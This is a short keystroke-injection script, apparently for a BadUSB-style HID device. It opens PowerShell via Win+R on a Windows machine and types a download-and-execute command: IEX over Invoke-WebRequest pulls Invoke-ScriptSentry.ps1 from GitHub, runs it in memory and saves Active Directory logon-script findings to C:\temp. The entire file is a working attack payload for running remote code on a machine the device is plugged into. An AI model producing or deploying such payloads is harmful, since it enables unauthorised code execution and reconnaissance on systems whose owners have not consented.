/*
Load Invoke-SentryScript.ps1 from github and save the output to C:\Temp\
author: Klau5t4ler0x90
*/

// sets typing speed to "natural"
function natural() {
  typingSpeed(100,150)	// Wait 100ms between key strokes + an additional random value between 0ms and 150ms (natural)
}

// sets typing speed as fast as possible
function fast() {
  typingSpeed(0,0)
}

// Open an interactive PowerShell console (Windows)
function startPS() {
	press("GUI r");
	delay(500);
	type("powershell\n")
}

// Execute Invoke-SentryScript.ps1 from Web over IEX
function InvokeScriptSentry() {
  type("IEX(Invoke-WebRequest 'https://raw.githubusercontent.com/techspence/ScriptSentry/main/Invoke-ScriptSentry.ps1'); Invoke-ScriptSentry | Out-File c:\\temp\\result_sentry.txt");
  press("ENTER");
}

layout('de');
fast();

startPS();
delay(500);

InvokeScriptSentry();